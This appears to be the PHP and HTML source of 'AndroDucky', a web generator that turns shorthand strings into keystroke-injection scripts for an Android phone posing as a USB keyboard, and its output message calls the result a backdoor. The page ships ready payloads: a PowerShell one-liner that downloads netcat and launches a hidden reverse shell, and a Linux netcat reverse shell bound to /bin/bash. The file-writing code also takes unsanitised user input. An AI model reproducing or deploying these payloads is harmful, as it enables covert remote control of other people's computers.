<!DOCTYPE html>
<html>
<head>
	<title>Generator of AndroDucky</title>
	<style type="text/css">
		* {box-sizing: border-box;}
		body {background-image:url("http://hdqwalls.com/wallpapers/mr-robot-mask-f-society-artwork-4k-on.jpg");background-size:100%;background-repeat: no-repeat;background-attachment: fixed;font-family: monospace;color: white;}
		pre {padding: 10px;background-color: rgba(0,0,0,.7);position: relative;top: -50px;}
		h1{font-size: 4em;}
		p{padding: 10px;background-color: rgba(0,0,0,.8);}
		h2{position: relative;top: -20px;padding: 0px;margin-top: -5px;}
		textarea{padding: 10px;width: 90%;background-color: #000;color: lime;text-shadow: 1px 1px 3px lime;}
		.btn {padding: 10px;background-color: lime;color: black;border:1px solid lime;border-radius: 5px;text-decoration: none;font-family: arial;font-size: 12px;font-weight: bold;position: relative;top: 15px;}
		form {position: relative;width: 500px;background-color: rgba(0,0,0,.7);padding: 20px;top: -70px;left: 50%;margin-left: -250px;}
		form input {padding: 5px;position: relative;top: -10px;}
		form input[type='file'], input[type='submit'] {margin-top: 20px;}
		form input[type='text']{width: 93%;background-color: black;border: 1px solid lime;color: lime;}
		form input[type='submit']{background-color: lime;color: black;border:1px solid lime;border-radius: 5px;text-decoration: none;font-family: arial;font-size: 12px;font-weight: bold;cursor: pointer;padding: 10px;}
</style>
</head>
<body bgcolor="black"><center>
<pre style="color:white;">
	<H1><font color="red" style="text-shadow: 1px 1px 20px red;">Andro</font><font color="lime" style="text-shadow: 1px 1px 15px lime;">Ducky</font> Options</H1>
	<h2>C => Execute Terminal Linux</h2>
	<h2>W => Executar Win</h2>
	<h2>E => Enter</h2>
	<h2>S => Space</h2>
	<h2>D => Delay</h2>
	<h2>I => &</h2>
	</center>
	<form method="post">
		<input type="text" name="filename" placeholder="Payload Name" maxlength="144"><br>
		<input type="file" name="file" accept="text/*" required>
		<input type="submit" name="env" value="Generate Payload">
	</form>
	<?php 
	if (isset($_POST["file"])) {
		$file = $_POST["file"]; // ISSO PEGA O COMANDO PARA SER COMPILADO
		$string = file_get_contents($file);
		$archive = $_POST["filename"] . ".sh"; // ISSO É PEGA O ARQUIVO QUE SERA CRIADO
		$arrayStrings = array("-", "+", ".", ",", "/", "(", ")", ":", "'", ";", ">", "%", "E", "S", "W", "D", "@", "I", "C");
		$arrayStringsSubs = array('minus', 'kp-plus', 'stop','comma', 'right-alt q', 'left-shift 9', 'left-shift 0', 'left-shift slash', 'tilde', 'slash', 'left-shift period', 'left-shift 5', 'enter', 'space', 'left-meta r', 'ping -c 2 localhost > null && ping -c 2 localhost > null && ping -c 2 localhost > null | APAGUE AQUI', 'left-shift 2', 'left-shift 7', 'left-ctrl t');
		$arrayNumbers = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 0);
		$arrayNumbersSub = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 0);
		$len = strlen($string);
		for ($i=0; $i < $len; $i++) { 
			$formato = $string[$i];
			if (in_array($formato, $arrayStrings)) {
				$formato = str_replace($arrayStrings, $arrayStringsSubs, $formato);
				$content = 'echo ' . $formato . ' | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
			}else {
				if(in_array($formato, $arrayNumbers)){
					$formato = str_replace($arrayNumbers, $arrayNumbersSub, $formato);
					$content = 'echo ' . $formato . ' | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
				}else {
					$content = 'echo "' . $string[$i] . '" | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
				}
			}
			if(!$abrir = fopen($archive, "a")){
				echo "Error";
			}
			$yes = fwrite($abrir, $content);
		}

			if ($yes){
				echo "<p><font color='lime' style='font-family:monospace;font-size:13px;font-weight:bold;'>Backdoor criada</font></p>";
				echo "<script>alert('Your archive : " . $archive . " " . filesize($archive) . "bytes')</script>";
			}
	}
	?>
	<center>
	<pre style="color: white;">
	<hr color="white" size="1">
	<h3>Powershell netcat reverse shell example</h3>
	<div>
	<textarea id="p1">WDcmdEDcolorSf7EechoSpowershellS(new-objectSsystem.net.webclient).downloadfile('link_netcat','nc.exe');S>x.batEechoSncSyou_ipSyour_portS-eScmdS>>x.batEpowershellS-windowstyleShiddenS./x.batE
	</textarea>
	<script type="text/javascript">
		var payload1 = document.getElementById("p1").value;
		document.write('<br><a href="?string='+payload1+'&archive=payload1" class="btn">Generate Payload</a><br>');
	</script>
	<h3>Troll cmd windows</h3>
	<textarea id="p2">WDcmdEDcolorSf7EstartSchrome.exeSwww.nyan.catEexitE</textarea>
	<script type="text/javascript">
		var payload2 = document.getElementById("p2").value;
		document.write('<br><a href="?string='+payload2+'&archive=payload2" class="btn">Generate Payload</a><br>');
	</script>
	<h3>Linux netcat reverse shell example</h3>
	<textarea id="p3">CDncSyour_ipSyour_portS-eS/bin/bashSIdismownSI>/dev/nullE</textarea>
	<script type="text/javascript">
		var payload3 = document.getElementById("p3").value;
		document.write('<br><a href="?string='+payload3+'&archive=payload3" class="btn">Generate Payload</a><br>');
	</script>
	</div>
</pre></center>
</body>
</html>
<?php 
ini_set('default_charset', 'UTF-8');
if(isset($_GET['string']) && $_GET['archive']):
	$string = $_GET['string']; // ISSO PEGA O COMANDO PARA SER COMPILADO
	$archive = $_GET['archive'] . ".sh"; // ISSO É PEGA O ARQUIVO QUE SERA CRIADO
	$arrayStrings = array("-", "+", ".", ",", "/", "(", ")", ":", "'", ";", ">", "%", "E", "S", "W", "D", "@", "I", "C");
	$arrayStringsSubs = array('minus', 'kp-plus', 'stop','comma', 'right-alt q', 'left-shift 9', 'left-shift 0', 'left-shift slash', 'tilde', 'slash', 'left-shift period', 'left-shift 5', 'enter', 'space', 'left-meta r', 'ping -c 2 localhost > null && ping -c 2 localhost > null && ping -c 2 localhost > null | APAGUE AQUI', 'left-shift 2', 'left-shift 7', 'left-ctrl t');
	$arrayNumbers = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 0);
	$arrayNumbersSub = array(1, 2, 3, 4, 5, 6, 7, 8, 9, 0);
	$len = strlen($string);
	for ($i=0; $i < $len; $i++) { 
		$formato = $string[$i];
		if (in_array($formato, $arrayStrings)) {
			$formato = str_replace($arrayStrings, $arrayStringsSubs, $formato);
			$content = 'echo ' . $formato . ' | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
		}else {
			if(in_array($formato, $arrayNumbers)){
				$formato = str_replace($arrayNumbers, $arrayNumbersSub, $formato);
				$content = 'echo ' . $formato . ' | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
			}else {
				$content = 'echo "' . $string[$i] . '" | ./hid-keyboard /dev/hidg0 keyboard > /dev/null' . "\r\n";
			}
		}
		if(!$abrir = fopen($archive, "a")){
			echo "Error";
		}
		$yes = fwrite($abrir, $content);
	}

		if ($yes){
			echo "<p><font color='lime' style='font-family:monospace;font-size:13px;font-weight:bold;'>Backdoor criada</font></p>";
			echo "<script>alert('Your archive : " . $archive . " " . filesize($archive) . "bytes')</script>";
		}
endif;
?>